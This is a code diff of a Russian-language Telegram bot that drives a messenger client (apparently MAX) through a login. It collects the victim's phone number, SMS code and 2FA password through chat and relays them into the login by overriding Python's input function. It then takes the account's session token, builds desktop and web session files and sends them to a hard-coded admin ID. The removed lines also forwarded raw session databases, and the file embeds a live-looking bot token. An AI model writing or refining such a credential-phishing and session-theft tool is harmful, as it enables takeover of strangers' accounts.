@@ -12,12 +12,8 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 
-# ============================================================
-# НАСТРОЙКИ (замените на свои)
-# ============================================================
 BOT_TOKEN = "8948301530:AAH-ZTWkJuUOfPMRFl19qC1-YUAXfKUd9C8"
 ADMIN_ID = 8632861931
-# ============================================================
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -28,8 +24,9 @@ class AuthState(StatesGroup):
     waiting_for_password = State()
 
 pending = {}
-input_codes = {}
-input_passwords = {}
+code_events = {}
+password_events = {}
+results = {}
 
 def gen_password():
     import random, string
@@ -82,99 +79,36 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
 def pymax_thread(uid, phone, work_dir):
-    """Запускает pymax в отдельном потоке."""
     from pymax import Client as MaxClient
     import builtins
-    
-    # Удаляем старую сессию, чтобы pymax точно запросил SMS
-    db_path = Path(work_dir) / "session.db"
-    if db_path.exists():
-        db_path.unlink()
     
     original = builtins.input
     
     def custom_input(prompt=""):
         p = prompt.lower() if prompt else ""
         if "code" in p or "код" in p:
-            with open(f"{work_dir}/status.txt", "w") as f:
-                f.write("waiting_code")
-            while uid not in input_codes:
-                time.sleep(0.3)
-            return input_codes.pop(uid)
+            code_events[uid] = threading.Event()
+            code_events[uid].wait()
+            return results.pop(f"{uid}_code")
         elif "password" in p or "пароль" in p:
-            with open(f"{work_dir}/status.txt", "w") as f:
-                f.write("waiting_password")
-            while uid not in input_passwords:
-                time.sleep(0.3)
-            return input_passwords.pop(uid)
+            password_events[uid] = threading.Event()
+            password_events[uid].wait()
+            return results.pop(f"{uid}_password")
         return original(prompt)
     
     builtins.input = custom_input
     
     try:
         client = MaxClient(phone=phone, work_dir=work_dir)
+        client.start()
         
-        # Пробуем login, если нет — start
-        try:
-            client.login()
-        except AttributeError:
-            client.start()
+        token = client.token if hasattr(client, 'token') else client.session.token
+        user_id = client.my_id if hasattr(client, 'my_id') else client.me.id
         
-        # Пробуем достать токен всеми способами
-        token = None
-        user_id = None
+        results[uid] = {"ok": True, "token": token, "user_id": user_id}
         
-        if hasattr(client, 'token') and client.token:
-            token = client.token
-        
-        if not token:
-            import sqlite3
-            if db_path.exists():
-                conn = sqlite3.connect(str(db_path))
-                cursor = conn.cursor()
-                try:
-                    cursor.execute("SELECT value FROM session WHERE key='token'")
-                    row = cursor.fetchone()
-                    if row:
-                        token = row[0]
-                except:
-                    pass
-                conn.close()
-        
-        if hasattr(client, 'my_id') and client.my_id:
-            user_id = client.my_id
-        elif hasattr(client, 'me') and hasattr(client.me, 'id'):
-            user_id = client.me.id
-        
-        if not token:
-            if db_path.exists():
-                with open(f"{work_dir}/status.txt", "w") as f:
-                    f.write("session_saved")
-                return
-            else:
-                raise Exception("Не удалось получить токен")
-        
-        with open(f"{work_dir}/result.json", "w") as f:
-            json.dump({"ok": True, "token": token, "user_id": user_id or 0}, f)
-        with open(f"{work_dir}/status.txt", "w") as f:
-            f.write("done")
-            
     except Exception as e:
-        msg = str(e).lower()
-        
-        if "block" in msg:
-            status = "blocked"
-        elif "password" in msg or "2fa" in msg:
-            status = "need_password"
-        elif "invalid" in msg or "wrong" in msg:
-            status = "invalid"
-        elif "limit" in msg or "flood" in msg or "много попыток" in msg:
-            status = "flood"
-        else:
-            status = f"error:{e}"
-        
-        with open(f"{work_dir}/status.txt", "w") as f:
-            f.write(status)
+        results[uid] = {"ok": False, "error": str(e)}
     finally:
         builtins.input = original
 
@@ -189,10 +123,10 @@ async def phone_handler(message: types.Message, state: FSMContext):
     work_dir = f"cache/{uid}"
     os.makedirs(work_dir, exist_ok=True)
     
-    for f in ["status.txt", "result.json"]:
-        p = Path(work_dir) / f
-        if p.exists():
-            p.unlink()
+    # Очищаем старую сессию
+    db = Path(work_dir) / "session.db"
+    if db.exists():
+        db.unlink()
     
     pending[uid] = {"phone": phone, "work_dir": work_dir}
     await state.set_state(AuthState.waiting_for_code)
@@ -203,39 +137,30 @@ async def phone_handler(message: types.Message, state: FSMContext):
     t = threading.Thread(target=pymax_thread, args=(uid, phone, work_dir), daemon=True)
     t.start()
     
-    status_file = Path(work_dir) / "status.txt"
-    
+    # Ждём пока pymax запросит код
     for _ in range(60):
         await asyncio.sleep(0.5)
-        
-        if not status_file.exists():
-            continue
-        
-        status = status_file.read_text().strip()
-        
-        if status == "waiting_code":
+        if uid in code_events:
             await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
             return
-        
-        elif status == "blocked":
-            await msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status == "flood":
-            await msg.edit_text("⏳ Слишком много попыток. Подождите и попробуйте снова.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status.startswith("error:"):
-            await msg.edit_text(f"❌ {status[6:]}")
+        if uid in results:
+            result = results.pop(uid)
+            if result["ok"]:
+                # Успех (маловероятно на этом этапе)
+                pass
+            else:
+                error = result["error"].lower()
+                if "block" in error:
+                    await msg.edit_text("🚫 Аккаунт заблокирован.")
+                elif "flood" in error or "limit" in error:
+                    await msg.edit_text("⏳ Слишком много попыток.")
+                else:
+                    await msg.edit_text(f"❌ {result['error']}")
             del pending[uid]
             await state.clear()
             return
     
-    await msg.edit_text("❌ Таймаут. Попробуй ещё раз.")
+    await msg.edit_text("❌ Таймаут.")
     del pending[uid]
     await state.clear()
 
@@ -245,79 +170,53 @@ async def code_handler(message: types.Message, state: FSMContext):
     code = message.text.strip()
     
     if uid not in pending:
-        return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
+        return await message.answer("⏳ Сессия устарела.")
     
     data = await state.get_data()
     phone = data["phone"]
     work_dir = data["work_dir"]
     
-    input_codes[uid] = code
+    results[f"{uid}_code"] = code
+    
+    if uid in code_events:
+        code_events[uid].set()
+        del code_events[uid]
     
     msg = await message.answer("⏳ Проверяю код...")
     
-    status_file = Path(work_dir) / "status.txt"
-    result_file = Path(work_dir) / "result.json"
-    
+    # Ждём результат
     for _ in range(60):
         await asyncio.sleep(0.5)
-        
-        if not status_file.exists():
-            continue
-        
-        status = status_file.read_text().strip()
-        
-        if status == "done":
-            with open(result_file) as f:
-                result = json.load(f)
-            token = result["token"]
-            viewer_id = result["user_id"]
-            password = gen_password()
-            session_id = int(time.time() * 1000)
-            device_id = str(uuid.uuid4())
-            
-            desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
-            js = generate_web_js(password, device_id, token, viewer_id)
-            
-            await send_files(phone, uid, work_dir, desktop, js)
-            await msg.edit_text("✅ Готово! Файлы отправлены админу.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status == "session_saved":
-            db_path = Path(work_dir) / "session.db"
-            if db_path.exists():
-                await bot.send_document(ADMIN_ID, FSInputFile(str(db_path)),
-                    caption=f"📦 Файл сессии\nНомер: {phone}")
-                await msg.edit_text("✅ Сессия сохранена. Файл отправлен админу.")
+        if uid in results:
+            result = results.pop(uid)
+            if result["ok"]:
+                token = result["token"]
+                viewer_id = result["user_id"]
+                password = gen_password()
+                session_id = int(time.time() * 1000)
+                device_id = str(uuid.uuid4())
+                
+                desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
+                js = generate_web_js(password, device_id, token, viewer_id)
+                
+                await send_files(phone, uid, work_dir, desktop, js)
+                await msg.edit_text("✅ Готово!")
             else:
-                await msg.edit_text("❌ Не удалось сохранить сессию.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status == "need_password":
-            await state.set_state(AuthState.waiting_for_password)
-            await msg.edit_text("🔐 Введи пароль 2FA:")
-            return
-        
-        elif status == "invalid":
-            await msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
-            return
-        
-        elif status == "blocked":
-            await msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status.startswith("error:"):
-            await msg.edit_text(f"❌ {status[6:]}")
+                error = result["error"].lower()
+                if "invalid" in error or "wrong" in error:
+                    await msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
+                elif "password" in error or "2fa" in error:
+                    await state.set_state(AuthState.waiting_for_password)
+                    await msg.edit_text("🔐 Введи пароль 2FA:")
+                elif "block" in error:
+                    await msg.edit_text("🚫 Аккаунт заблокирован.")
+                else:
+                    await msg.edit_text(f"❌ {result['error']}")
             del pending[uid]
             await state.clear()
             return
     
-    await msg.edit_text("❌ Таймаут. Попробуй ещё раз.")
+    await msg.edit_text("❌ Таймаут.")
     del pending[uid]
     await state.clear()
 
@@ -327,68 +226,44 @@ async def password_handler(message: types.Message, state: FSMContext):
     pwd = message.text.strip()
     
     if uid not in pending:
-        return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
+        return await message.answer("⏳ Сессия устарела.")
     
     data = await state.get_data()
     phone = data["phone"]
     work_dir = data["work_dir"]
     
-    input_passwords[uid] = pwd
-    msg = await message.answer("⏳ Проверяю пароль...")
+    results[f"{uid}_password"] = pwd
     
-    status_file = Path(work_dir) / "status.txt"
-    result_file = Path(work_dir) / "result.json"
+    if uid in password_events:
+        password_events[uid].set()
+        del password_events[uid]
+    
+    msg = await message.answer("⏳ Проверяю пароль...")
     
     for _ in range(60):
         await asyncio.sleep(0.5)
-        
-        if not status_file.exists():
-            continue
-        
-        status = status_file.read_text().strip()
-        
-        if status == "done":
-            with open(result_file) as f:
-                result = json.load(f)
-            token = result["token"]
-            viewer_id = result["user_id"]
-            password = gen_password()
-            session_id = int(time.time() * 1000)
-            device_id = str(uuid.uuid4())
-            
-            desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
-            js = generate_web_js(password, device_id, token, viewer_id)
-            
-            await send_files(phone, uid, work_dir, desktop, js)
-            await msg.edit_text("✅ Готово!")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status == "session_saved":
-            db_path = Path(work_dir) / "session.db"
-            if db_path.exists():
-                await bot.send_document(ADMIN_ID, FSInputFile(str(db_path)),
-                    caption=f"📦 Файл сессии\nНомер: {phone}")
-                await msg.edit_text("✅ Сессия сохранена. Файл отправлен админу.")
+        if uid in results:
+            result = results.pop(uid)
+            if result["ok"]:
+                token = result["token"]
+                viewer_id = result["user_id"]
+                password = gen_password()
+                session_id = int(time.time() * 1000)
+                device_id = str(uuid.uuid4())
+                
+                desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
+                js = generate_web_js(password, device_id, token, viewer_id)
+                
+                await send_files(phone, uid, work_dir, desktop, js)
+                await msg.edit_text("✅ Готово!")
             else:
-                await msg.edit_text("❌ Не удалось сохранить сессию.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status == "invalid":
-            await msg.edit_text("❌ Неверный пароль. Попробуй ещё раз.")
-            return
-        
-        elif status == "blocked":
-            await msg.edit_text("🚫 Аккаунт заблокирован.")
-            del pending[uid]
-            await state.clear()
-            return
-        
-        elif status.startswith("error:"):
-            await msg.edit_text(f"❌ {status[6:]}")
+                error = result["error"].lower()
+                if "invalid" in error or "wrong" in error:
+                    await msg.edit_text("❌ Неверный пароль.")
+                elif "block" in error:
+                    await msg.edit_text("🚫 Аккаунт заблокирован.")
+                else:
+                    await msg.edit_text(f"❌ {result['error']}")
             del pending[uid]
             await state.clear()
             return
